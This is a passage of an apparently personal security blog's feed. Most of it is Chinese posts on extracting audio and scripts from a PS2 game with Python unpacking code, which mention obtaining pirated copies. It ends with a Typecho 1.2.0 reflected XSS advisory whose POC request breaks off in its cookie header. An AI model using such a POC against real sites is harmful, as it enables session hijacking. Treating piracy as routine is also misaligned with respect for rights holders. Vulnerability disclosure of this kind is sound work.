class="string">&quot;.&quot;</span>.join(filename.split(<span class="string">&quot;.&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    name = os.path.basename(filename)</span><br><span class="line">    name_part = name.split(<span class="string">&quot;_&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename + <span class="string">&quot;.vag&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(</span><br><span class="line">            <span class="string">b&quot;\x56\x41\x47\x70&quot;</span></span><br><span class="line">            + <span class="string">b&quot;\x00\x00\x00\x06&quot;</span></span><br><span class="line">            + <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line">            + struct.pack(<span class="string">&quot;&gt;I&quot;</span>, <span class="built_in">int</span>(name_part[-<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line">            + <span class="string">b&quot;\x00\x00\x56\x22&quot;</span></span><br><span class="line">            + <span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">            + <span class="string">&quot;_&quot;</span>.join(name_part[:-<span class="number">1</span>]).encode().ljust(<span class="number">16</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">            + data</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用 <code>xargs</code> 批量修复 <code>VOICE_ID</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> *.dat | xargs -I &#123;&#125; sh -c <span class="string">&#x27;echo &#123;&#125; &amp;&amp; python3 ./vag.py ./&#123;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>利用 <code>ffmpeg</code> 批量转换为 <code>.wavs</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> *.vag | <span class="built_in">cut</span> -d <span class="string">&#x27;.&#x27;</span> -f 1 | xargs -I &#123;&#125; ffmpeg -i &#123;&#125;.vag &#123;&#125;.wav</span><br></pre></td></tr></table></figure><p>到此，<code>VOICE_ID</code> 分析完成，同理可以提取出 <code>SOUND_ID</code> 中的音乐，发现 <code>SOUND_ID</code> 中存储的基本都是 BGM，除此以外，在 <code>SOUND_ID</code> 中还有一部分文件保存类似偏移或者长度的数据，例如 <code>1_0_14.dat</code></p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/1.jpg" alt="Not Found"></p><p>经过观察可以发现每隔一定数量的 BGM 就会出现一个这种文件，一共出现 36 个，该文件长度固定为 20 字节，开始为固定的 4 字节的 <code>0x00</code>，结尾为 4 字节的 <code>0x00</code> 或者 <code>0xff</code>，中间可能是小端保存的 3 个 int，例如上图中间的 <code>0xac12</code>，<code>0x01</code> 以及 <code>0x1000</code> 三个数字。此外，还有 9 个空文件，例如第一个文件 <code>0_0_0.dat</code>。该文件的作用暂时未知，不影响我们对 <code>SOUIND_ID</code> 的分析以及提取。</p>]]></content>
    
    
    <summary type="html">一个Web狗针对某上古时期的PlayStation2游戏的逆向以及资源提取记录。</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="ReverseEngineering" scheme="https://srpopty.github.io/tags/ReverseEngineering/"/>
    
  </entry>
  
  <entry>
    <title>某上古 PS2 游戏逆向（一）文件提取</title>
    <link href="https://srpopty.github.io/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://srpopty.github.io/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2023-06-10T08:53:57.000Z</published>
    <updated>2023-06-10T08:53:57.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="# 前言" class="headerlink" title="前言"></a>前言 </h1><p> 最近几个月迷上了某上古动漫，希望借助 AI 技术复活动漫中的女主角。经过一番搜罗发现该动漫居然出过三款 PS2 文字冒险游戏，为了方便收集训练数据，需要从这三个 PS2 游戏中提取一些资源。然而毕竟是上古动漫，而且从来没接触过 PS2 的逆向，本文记录了一个 Web 狗针对一个上古 PS2 游戏的逆向全过程。</p><p>作为一个上古时期的动漫，第一款 PS2 游戏发售的时候北京奥运会都还没举行，因此在这个年代找到这三款上古游戏的资源确实是不容易，不过最终经过三天的努力，借助 Google Hacking 以及其他 Web 手段下载了这三款 <font style="color: black;background: black;"><del> 盗版 </del></font> 游戏。</p><p>PS2（Sony PlayStation2）是一款非常古老的游戏主机，在现代 Mac 系统上使用 <a href="https://pcsx2.net/">PCSX2 模拟器</a> 运行 PS2 游戏的效果还不错，不过需要下载 BIOS，当然，借助 Google Hacking 还是比较容易找到这些 PS2 的 BIOS，包括欧版，日版，美版等。</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/1.jpg" alt="Not Found"></p><p>逆向之前先试着玩了玩，确定三个游戏都可以正常运行，可惜都是日文，年代太久远了没有任何汉化，文字冒险游戏只看日文也确实玩不明白，只能听个响看个图，外网搜索了很久也几乎没人关注这个游戏的逆向，因此一切都需要从头开始。本文工作量较大，内容较多，将分为多个部分记录。</p><h1 id="目录结构与文件分析"><a href="# 目录结构与文件分析" class="headerlink" title="目录结构与文件分析"></a>目录结构与文件分析 </h1><p> 下载好的游戏都是常见的游戏光盘 iso 格式，直接打开 iso 就可以看到里面的目录。由于三个游戏都是同一家厂商开发，因此本文主要以其中一个游戏进行逆向。游戏本身 1.9G 左右，打开 iso 光盘里面的目录结构如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">/Users/srpopty/Desktop/xxxx</span><br><span class="line">├── IOP</span><br><span class="line">│   ├── CDVDSTM.IRX</span><br><span class="line">│   ├── DBCMAN.IRX</span><br><span class="line">│   ├── DS2U_D.IRX</span><br><span class="line">│   ├── IOPRP310.IMG</span><br><span class="line">│   ├── LIBSD.IRX</span><br><span class="line">│   ├── MC2_D.IRX</span><br><span class="line">│   ├── MODHSYN.IRX</span><br><span class="line">│   ├── MODMIDI.IRX</span><br><span class="line">│   ├── SDRDRV.IRX</span><br><span class="line">│   ├── SIO2D.IRX</span><br><span class="line">│   ├── SIO2MAN.IRX</span><br><span class="line">│   ├── SKHSYNTH.IRX</span><br><span class="line">│   ├── SKMIDI.IRX</span><br><span class="line">│   ├── SKSOUND.IRX</span><br><span class="line">│   └── USBD.IRX</span><br><span class="line">├── MOVIE</span><br><span class="line">│   ├── MMVLOGO.PSS</span><br><span class="line">│   ├── WARP.PSS</span><br><span class="line">│   ├── ZERO3ED.PSS</span><br><span class="line">│   └── ZERO3OP.PSS</span><br><span class="line">├── NORMAL.BIN</span><br><span class="line">├── NORMAL.HD</span><br><span class="line">├── SCENEDAT.BIN</span><br><span class="line">├── SCENEDAT.HD</span><br><span class="line">├── SCENE_ID.BIN</span><br><span class="line">├── SCENE_ID.HD</span><br><span class="line">├── SLPS_258.97</span><br><span class="line">├── SOUND_ID.BIN</span><br><span class="line">├── SOUND_ID.HD</span><br><span class="line">├── SYSTEM.BIN</span><br><span class="line">├── SYSTEM.CNF</span><br><span class="line">├── SYSTEM.HD</span><br><span class="line">├── VOICE_ID.BIN</span><br><span class="line">└── VOICE_ID.HD</span><br><span class="line"></span><br><span class="line">3 directories, 33 files</span><br></pre></td></tr></table></figure><p>大概了解一些 PS2 的开发基础，相较于现代游戏主机，PS2 的开发较为自由，换句话说就是不太规范，各种文件、脚本、字节码这些格式开发者甚至可以自己定义。</p><p>首先在 CD 根目录中，<code>SLPS_xxx.xx</code> 一般作为游戏主程序，也就是主要入口，游戏运行时首先执行的就是就是这个程序，从 <code>SYSTEM.CNF</code> 中也能看到这个信息，<code>file</code> 一下也可以看到是 32 位的 mips，静态链接，无符号表，可以用 IDA 反汇编，或者直接用 Ghidra 反编译。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF 32-bit LSB executable, MIPS, MIPS-III version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>此外还可以看到两个目录 <code>IOP</code> 和 <code>MOVIE</code>。在 PS2 中，<code>IOP</code> 类似 Windows 的 <code>.dll</code> 以及 Unix 的 <code>.so</code>，属于动态链接库，<code>file</code> 一下目录中的 <code>.IRX</code> 文件也可以看到是和 <code>SLPS_xxx.xx</code> 一样的 MIPS ELF，但是单靠文件名暂时不好判断其功能。而在 <code>MOIVE</code> 中的 <code>.PSS</code> 是一种视频文件格式，可以直接用 VLC 播放，但是没有声音，包括了厂商 logo、开头的 OP、结束的 ED 以及一个 <code>WARP</code> 视频。</p><p>之后在 CD 根目录下可以看到很多同名的 <code>.BIN</code> 和 <code>.HD</code> 文件，包括 <code>NORMAL</code>，<code>SCENE_ID</code>，<code>SCENEDAT</code>，<code>SOUND_ID</code>，<code>VOICE_ID</code> 以及 <code>SYSTEM</code>，用 <code>file</code> 或者 <code>binwalk</code> 也查不出来是什么类型的文件。</p><p>通过分析 <code>.BIN</code> 文件和 <code>.HD</code> 文件的大小（如下表所示），推测 <code>.HD</code> 与 <code>.BIN</code> 存在对应关系，<code>.BIN</code> 可能是多个文件打包，而 <code>.HD</code> 则存储了映射关系。</p><table><thead><tr><th>Name</th><th>NORMAL</th><th>SCENE_ID</th><th>SCENEDAT</th><th>SOUND_ID</th><th>VOICE_ID</th><th>SYSTEM</th></tr></thead><tbody><tr><td>.BIN</td><td>12 MB</td><td>7.4b MB</td><td>171 MB</td><td>363 MB</td><td>1.2 GB</td><td>906 KB</td></tr><tr><td>.HD</td><td>2.6 KB</td><td>2.3 KB</td><td>8.4 KB</td><td>724 B</td><td>83 KB</td><td>168 B</td></tr></tbody></table><p>首先根据文件名以及对应的文件大小可以大致猜出，<code>SCENEDAT</code> 中保存的可能是各种场景资源，例如贴图，<code>SOUND_ID</code> 中保存的是音效，而最大的 <code>VOICE_ID</code> 中保存的可能就是角色的语音。</p><p>本文的最终目标是提取出角色声音，也就是 <code>VOICE_ID</code> 中的音频以及对应的文本作为训练数据。</p><h1 id="BIN 文件提取"><a href="#BIN 文件提取" class="headerlink" title="BIN 文件提取"></a>BIN 文件提取 </h1><p> 既然 <code>.HD</code> 和 <code>.BIN</code> 是存在对应关系，那么首先要想办法利用 <code>.HD</code> 从 <code>.BIN</code> 中提取文件。首先以最小的 <code>SYSTEM</code> 为例，用 010 Editor 查看可以看到 <code>SYSTEM.BIN</code> 中保存了类似代码的明文数据</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/2.jpg" alt="Not Found"></p><p>并且每隔一段距离就会出现大量的 <code>0xff</code>，类似分隔符</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/3.jpg" alt="Not Found"></p><p>虽然可以看到类似代码的明文，但是其中也夹杂了很多不可见字符，此外明文中也可以看到很多 for、if 这种语法结构，因此不可能是某种语言的字节码，那么直接用文本模式打开 <code>SYSTEM</code> 可以看到不可见字符全部出现在了类似 C 风格的注释中。</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/4.jpg" alt="Not Found"></p><p>考虑到这是个日本发行商的游戏，因此猜测可能是日文注释，重新用日文编码 <code>Shift JIS</code> 打开文件可以看到正常的文件内容，果然是用日语写注释。。。</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/5.jpg" alt="Not Found"></p><p>尽管目前可以看到某种类似脚本语言的明文代码，但是每隔一段代码都会出现大量的 <code>0xff</code></p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/6.jpg" alt="Not Found"></p><p>同时打开其他几个 <code>.BIN</code> 文件，也可以看到每隔一段就会出现大量的 <code>0xff</code>，并且出现的数量并不确定，但是总是会填充到整数后出现其他内容，推测 <code>0xff</code> 可能用于填充对其并分割不同文件，例如下图中 <code>SYSTEM.BIN</code> 的第一段代码被 <code>0xff</code> 填充并对齐到了 0x1800，作为一个 chunk</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/7.jpg" alt="Not Found"></p><p>继续向后分析几段，可以发现每一个 chunk 的大小都是不同的，但都是整数，其实分析到这里基本可以确定大量的 <code>0xff</code> 的作用就是分隔文件内容，但是至于为什么要填充到某个具体的整数，原因未知，例如 <code>SYSTEM.BIN</code> 第一个 chunk 为什么填充到 0x1800 而不是 0x1700。</p><p>继续分析 <code>SYSTEM.HD</code> 中的内容</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/8.jpg" alt="Not Found"></p><p>第一眼就可以看到大量的 <code>00 00</code>，少部分的 <code>01 00</code>，根据经验推测很有可能是小端存储的 int，每 4 个字节作为一个数字，查看其他几个 <code>.HD</code> 文件也可以看出 <code>.HD</code> 文件大小一定是 4 的倍数。但是每个 int 并没有什么规律，有大有小，也没有经过排序。</p><p>根据以往的逆向经历，例如对阴阳师 <code>.npk</code> 的逆向，通过头表（Header Table）中存储的偏移 offset 和文件长度 length 这两个值就可以从打包存储的数据中提取指定位置的文件，因此这个 int 一定是 offset 或者 length 之一，才会与 <code>.BIN</code> 相对应。假如 int 表示的是 offset，存储偏移的表通常是有顺序的，并且偏移一定是唯一的，而在某些 <code>.HD</code> 文件中出现了重复的值，因此这里的 int 一定不是偏移，怀疑可能是 length。</p><p>根据前文的结论，<code>.BIN</code> 的一个 chunk 前一部分保存了文件内容，后一部分保存 <code>0xff</code> 用于对齐分隔，假设 <code>.HD</code> 中第一个值 0x131e 对应的是 <code>.BIN</code> 中的第一个文件内容的长度而不是 chunk 的长度，验证一下</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/9.jpg" alt="Not Found"></p><p><code>SYSTEM.BIN</code> 中第一个文件内容长度刚好是 0x131e，对应 <code>SYSTEM.HD</code> 的第一个小端 int <code>1E 13 00 00</code>，再验证一下下一个 chunk 刚好也是 0x15e4，对应 <code>SYSTEM.HD</code> 的第二个小端 int <code>E4 15 00 00</code></p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/10.jpg" alt="Not Found"></p><p>验证其他几个 <code>.BIN</code> 和 <code>.HD</code> 也可以得到同样的结论。到此，基本就可以确定 <code>.HD</code> 中保存的就是 <code>.BIN</code> 中每个文件内容的长度，并且每个文件内容后会被填充大量的 <code>0xff</code> 分隔同时对其到某个整数。那么基于此，可以写出对应的提取脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: extract.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#     Extract files from .BIN by .HD in some ps2 games.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">name, ext=<span class="string">&quot;dat&quot;</span></span>):</span><br><span class="line">    output_dir = <span class="string">&quot;./&quot;</span> + name + <span class="string">&quot;_extracted&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_dir):</span><br><span class="line">        os.mkdir(output_dir)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Extracting &quot;%s&quot; to &quot;%s&quot;...&#x27;</span> % (name, output_dir))</span><br><span class="line"></span><br><span class="line">    hd_file = name + <span class="string">&quot;.HD&quot;</span></span><br><span class="line">    hd_filesize = os.path.getsize(hd_file)</span><br><span class="line">    hd_file = <span class="built_in">open</span>(hd_file, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    bin_file = name + <span class="string">&quot;.BIN&quot;</span></span><br><span class="line">    bin_filesize = os.path.getsize(bin_file)</span><br><span class="line">    bin_file = <span class="built_in">open</span>(bin_file, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hd_filesize % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  Invalid head file size: &quot;</span> + <span class="built_in">hex</span>(hd_filesize))</span><br><span class="line">        bin_file.close()</span><br><span class="line">        hd_file.close()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  Head file size: &quot;</span> + <span class="built_in">hex</span>(hd_filesize))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  Bin file size: &quot;</span> + <span class="built_in">hex</span>(bin_filesize))</span><br><span class="line"></span><br><span class="line">    file_count = hd_filesize &gt;&gt; <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  Total %d files to be extracted.&quot;</span> % file_count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(file_count):</span><br><span class="line">        filesize = struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, hd_file.read(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">        filename = os.path.join(</span><br><span class="line">            output_dir,</span><br><span class="line">            <span class="string">&quot;%d_%s_%s.%s&quot;</span> % (i, <span class="built_in">hex</span>(bin_file.tell())[<span class="number">2</span>:], <span class="built_in">hex</span>(filesize)[<span class="number">2</span>:], ext),</span><br><span class="line">        )</span><br><span class="line">        data = bin_file.read(filesize)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(data)</span><br><span class="line"></span><br><span class="line">        chunk_size = filesize</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = bin_file.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> data != <span class="string">b&quot;\xff&quot;</span>:</span><br><span class="line">                bin_file.seek(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            chunk_size += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&#x27;    [%d] Extracted file to &quot;%s&quot; with filesize %s in chunk size %s&#x27;</span></span><br><span class="line">            % (i, filename, <span class="built_in">hex</span>(filesize), <span class="built_in">hex</span>(chunk_size))</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bin_file.tell() != bin_filesize:</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;  Bin file not finished! Current offset in %s but filesize is %s!&quot;</span></span><br><span class="line">            % (<span class="built_in">hex</span>(bin_file.tell()), <span class="built_in">hex</span>(bin_filesize))</span><br><span class="line">        )</span><br><span class="line">    bin_file.close()</span><br><span class="line">    hd_file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        main(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        main(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 CD 根目录执行脚本 <code>python extract.py &lt;name&gt; [ext=dat]</code>，例如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python extract.py SYSTEM</span><br></pre></td></tr></table></figure><p>同时可以指定提取出的文件后缀，默认是 <code>.dat</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python extract.py SYSTEM py</span><br></pre></td></tr></table></figure><p>提取出的文件后保存在 <code>&lt;name&gt;_extracted</code> 目录中，例如 <code>SYSTEM_extracted</code>，文件名为 <code>id_offset_length.ext</code>，其中 <code>id</code> 为文件序号，按照文件出现的顺序从 0 开始，<code>offset</code> 为文件在 <code>.BIN</code> 中的偏移，<code>length</code> 为 <code>.HD</code>中保存的文件内容大小。</p><p>最后按顺序提取出 <code>NORMAL.BIN</code>，<code>SCENE_ID.BIN</code>，<code>SCENEDAT.BIN</code>，<code>SOUND_ID.BIN</code>，<code>SYSTEM.BIN</code> 以及 <code>VOICE_ID.BIN</code> 中的所有文件。</p>]]></content>
    
    
    <summary type="html">一个Web狗针对某上古时期的PlayStation2游戏的逆向以及资源提取记录。</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="ReverseEngineering" scheme="https://srpopty.github.io/tags/ReverseEngineering/"/>
    
  </entry>
  
  <entry>
    <title>Typecho V1.2.0 Backend Reflected XSS</title>
    <link href="https://srpopty.github.io/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/"/>
    <id>https://srpopty.github.io/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/</id>
    <published>2023-03-02T07:25:53.000Z</published>
    <updated>2023-03-02T07:25:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Typecho admin backend Comment Manager <code>/admin/manage-comments.php</code> with reflected-XSS via unfiltered POST parameter <code>cid</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to typecho admin backend management system.</li><li>In Comment Manager <code>/admin/manage-comments.php</code>, the unfiltered <code>$request-&gt;cid</code> is directly echoed to html.</li></ol><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/6.png"></p><p>The full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/typecho/admin/manage-comments.php?status=wating&amp;category=&amp;keywords=abc&amp;__typecho_all_posts=off&amp;uid=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.10</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.10/cms/typecho/admin/login.php?referer=http%3A%2F%2F192.168.0.10%2Fcms%2Ftypecho%2Fadmin%2Fmanage-comments.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>745020ecd4b17dde48d43755702a78b4__typecho_uid=1; 745020ecd4b17dde48d43755702a78b4__typecho_authCode=%24T%249aGUcl7K02f405471bbdacf65892bf8ffb75bc211; PHPSESSID=m7h7isuus6cugk6mb58vdah296; u5DD_2132_saltkey=ql9191Ym; u5DD_2132_lastvisit=1677486351; u5DD_2132_seccodecSASGLE52ETX=1.1b4fba6d0be0f7dce2; u5DD_2132_ulastactivity=dd6b5bfUH2dwkFNJ5HnOvs2bnRKl16bY2TMsiYWsOsPOeru7pyMl; u5DD_2132_auth=ade9wjKb33QiAdI8RrnDloFyK4vB8ca3sx7pIgT0BNlWPo1CeA%2Bsk87ST8rZ%2FVqZTdeIhOInVMfZCF8zm7uu; u5DD_2132_lastcheckfeed=1%7C1677489964; u5DD_2132_nofavfid=1; u5DD_2132_home_diymode=1; u5DD_2132_visitedfid=2; u5DD_2132_smile=1D1; u5DD_2132_home_readfeed=1677497943; 